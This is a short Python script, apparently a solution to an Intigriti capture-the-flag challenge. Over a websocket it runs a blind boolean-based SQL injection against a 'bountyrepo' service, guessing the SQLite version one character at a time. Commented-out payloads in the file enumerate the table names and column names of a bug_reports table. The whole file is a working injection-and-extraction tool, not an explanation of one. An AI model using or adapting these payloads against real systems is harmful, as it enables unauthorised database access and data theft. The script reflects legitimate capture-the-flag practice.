import string
from websockets.sync.client import connect
import json

URL = 'bountyrepo.ctf.intigriti.io'
# ALPHABET = string.ascii_uppercase # string.ascii_letters + '{!_}'
ALPHABET = string.digits + '.'
PAYLOAD = "1 AND (select sqlite_version()) LIKE '{guess}%' -- -"

# flag = 'INTIGRITI' 
flag = '' 
with connect(f"wss://{URL}/ws") as websocket:
    while True:
        for c in ALPHABET:
            payload = PAYLOAD.format(guess=flag + c)
            print('\r>>>', payload, end='')
            websocket.send(json.dumps({"id": payload}))
            message = websocket.recv()
            if 'Bug not found!' not in message:
                flag += c
                print()
                print(flag)
                break


'''
# PAYLOAD = "1 AND (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') LIKE '{tables}%' -- -"
# tables = "bug_reports"
# PAYLOAD = "1 AND (SELECT GROUP_CONCAT(name) FROM PRAGMA_TABLE_INFO('bug_reports')) LIKE '{guess}%' --"
# columns = 'id,category,description,severity,cvss_score,status,reported_by,reported_date'
'''